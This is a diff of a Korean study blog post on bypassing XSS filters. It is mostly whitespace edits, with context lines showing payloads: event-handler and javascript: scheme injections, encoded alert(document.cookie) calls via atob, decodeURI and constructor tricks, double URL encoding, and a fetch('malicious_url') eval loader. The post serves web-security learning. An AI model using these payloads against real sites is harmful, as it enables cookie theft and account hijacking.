@@ -1,6 +1,6 @@
 ---
 title: '[Study] XSS Filtering Bypass'
-date: 2023-01-23 00:00:00
+date: 2023-01-23 00:00:00 +0900
 categories: [Study, Web Hacking]
 tags: [xss]
 ---
@@ -14,7 +14,7 @@ tags: [xss]
 
 ---
 
-태그의 속성 값으로 스크립트를 포함할 수 있는 경우가 존재한다. 대표적으로 
+태그의 속성 값으로 스크립트를 포함할 수 있는 경우가 존재한다. 대표적으로
 **이벤트 핸들러**를 지정하는 `on`으로 시작하는 속성들이 존재한다. 이벤트 핸들러란 특정 요소에서 발생하는 이벤트를 처리하기 위해 존재하는 콜백 형태의 핸들러 함수이다.
 
 자주 사용되는 이벤트 핸들러 속성: `onload`, `onerror`, `onfocus`
@@ -137,7 +137,7 @@ normalizeURL('\4\4jAva\tScRIpT:alert(1)')
 ```html
 <!-- src 속성에서 활성 하이퍼링크 이용 -->
 <iframe src="javascript:alert(1)">
-  
+
 <!-- srcdoc 속성을 이용 -->
 <iframe srcdoc="<&#x69;mg src=1 &#x6f;nerror=alert(parent.document.domain)>">
 ```
@@ -195,7 +195,7 @@ document["coo"+"kie"] == document["cookie"] == document.cookie
 1. **RegExp** 객체 사용하기
 
 	RegExp 객체를 생성하고 객체의 패턴 부분을 가져옴으로써 문자열을 만들 수 있다.
-	
+
     ```javascript
 	var foo = /Hello World!/.source; // "Hello World!"
 	var bar = /test !/ + [];         // "/test !/"
@@ -204,36 +204,36 @@ document["coo"+"kie"] == document["cookie"] == document.cookie
 2. **String.fromCharCode** 함수 사용
 
 	`String.fromCharCode` 함수는 유니코드의 범위 중 파라미터로 전달된 수에 해당하는 문자를 반환한다.
-    
+
     ```javascript
 	var foo = String.fromCharCode(72, 101, 108, 108, 111); // "Hello"
 	```
-    
+
 3. 기본 내장 함수나 객체의 문자를 사용하는 방법
 
 	내장 함수나 객체를 `toString` 함수를 통해 문자열로 변경하면 형태가 문자열로 변환된다. 원하는 문자열을 만드는데 필요한 문자들을 한 글자씩 가져와 문자열을 만들 수 있다.
-    
+
     ```javascript
 	var baz = history.toString()[8] + // "H"
 	(history+[])[9] + // "i"
 	(URL+0)[12] + // "("
 	(URL+0)[13]; // ")" ==> "Hi()"
 	```
-    
+
     - `history.toString()` : `"[object History]"` 문자열 반환
     - `URL.toString()` : `"function URL () { [native code] }"` 문자열 반환
 
 4. 숫자 객체의 진법 변환
-	
+
     10진수 숫자를 36진수로 변경하여 ASCII 영어 소문자 범위를 모두 생성할 수 있다. 이때, `E4X 연산자 ("..")`가 존재하는데, 주로 점 두개를 쓰거나 소수점으로 인식되지 않도록 공백과 점을 조합해 사용할 수 있다.
-    
+
     ```javascript
 	var foo = 29234652..toString(36); // "hello"
 	var bar = 29234652 .toString(36); // "hello"
 	```
 
 <br>
-    
+
 ### 함수 호출
 
 일반적인 자바스크립트의 함수 호출 방법
@@ -248,7 +248,7 @@ alert`1`; // Tagged Templates
 1. **javascript 스키마**를 이용한 location 변경
 
 	`javascript:` 스키마를 이용해 `location` 객체를 변조하는 방식으로 자바스크립트 코드 실행.
-    
+
     ```javascript
 	location = "javascript:alert\x281\x29;";
 	location.href = "javascript:alert\u00281\u0029;";
@@ -256,9 +256,9 @@ alert`1`; // Tagged Templates
     ```
 
 2. **Symbol.hasInstance** 오버라이딩
-	
+
 	ECMAScript 6에 추가된 Symbol을 속성 명칭으로 사용할 수 있다. `0 instanceof C`를 연산할 때, `C`에 `Symbol.hasInstance` 속성에 함수가 있을 경우 메소드로 호출하여 `instanceof` 연산자의 결과 값으로 사용하게 된다. `instanceof`를 연산하게 되면 실제 인스턴스 체크 대신 원하는 함수를 메소드로 호출되도록 할 수 있다.
-    
+
     ```javascript
 	"alert\x28document.domain\x29"instanceof{[Symbol.hasInstance]:eval};
 	Array.prototype[Symbol.hasInstance]=eval;"alert\x28document.domain\x29"instanceof[];
@@ -267,7 +267,7 @@ alert`1`; // Tagged Templates
 3. **document.body.innerHTML** 추가
 
 	`document.body.innerHTML`에 코드를 추가할 경우 새로운 HTML 코드가 문서에 추가되고, 코드를 실행할 수 있다. 이때, `innerHTML`로 HTML 코드를 실행할 때에는 보안 상 `<script>` 태그를 삽입해도 실행되지 않는다. 따라서 이벤트 핸들러를 이용해 코드를 실행해야 한다.
-    
+
     ```javascript
 	document.body.innerHTML += "<img src=x: onerror=alert&#40;1&#41;>";
 	documnet.body.innerHTML += "<body src=x: onload=alert&#40;1&#41;>";
@@ -304,7 +304,7 @@ POST /search?query=%253Cscript%253Ealert(document.cookie)%253C/script%253E HTTP/
 Fragment로 스크립트를 넘겨주고 XSS 지점에서 `location.hash`로 fragment 부분을 추출하여 `eval()` 로 실행하는 기법이 흔히 사용된다.
 
 ```
-https://example.com/?q=<img onerror="eval(location.hash.slice(1))">#alert(1); 
+https://example.com/?q=<img onerror="eval(location.hash.slice(1))">#alert(1);
 ```
 
 <br>
@@ -346,19 +346,19 @@ fetch('malicious_url').then(x=>eval(x.text()))
   		return true;
 	}
 	```
-    
+
     **Bypass**
     ```javascript
 	// 1) 유니코드 이용
 	\u0061lert(\u0064ocument.cookie);
-               
+
 	// 2) this 키워드로 window 객체 접근
 	this['al'+'ert'](this['docu'+'ment']['coo'+'kie']);
 	```
 
 <br>
 
-2. 주요 키워드와 특수문자 필터링 
+2. 주요 키워드와 특수문자 필터링
 
 	`alert(document.cookie)` 실행
 
@@ -371,25 +371,25 @@ fetch('malicious_url').then(x=>eval(x.text()))
   		return true;
 	}
 	```
-    
+
     **Bypass**
     ```javascript
 	// 1) decodeURI 함수 이용
 	Boolean[decodeURI('%63%6F%6E%73%74%72%75%63%74%6F%72')](
       decodeURI('%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%29'))();
-               
+
 	// 2) atob 함수 & constructor 속성 이용
 	Boolean[atob('Y29uc3RydWN0b3I')](atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ'))();
 	```
-    
+
     - 1) URL Encoding은 하단의 사이트 참고
     	https://www.w3schools.com/tags/ref_urlencode.ASP
         https://onlineasciitools.com/url-encode-ascii
     - 2) Base64 값은 `btoa('string')` 함수 이용
-    
-    
+
+
     <br>
-    
+
 3. (, ), ", ', \` 필터링
 
 	`alert(document.cookie)` 실행
@@ -403,7 +403,7 @@ fetch('malicious_url').then(x=>eval(x.text()))
   		return true;
 	}
 	```
-    
+
     **Bypass**
     ```javascript
 	// 1) RegExp & URL.toString & Symbol.hasInstance
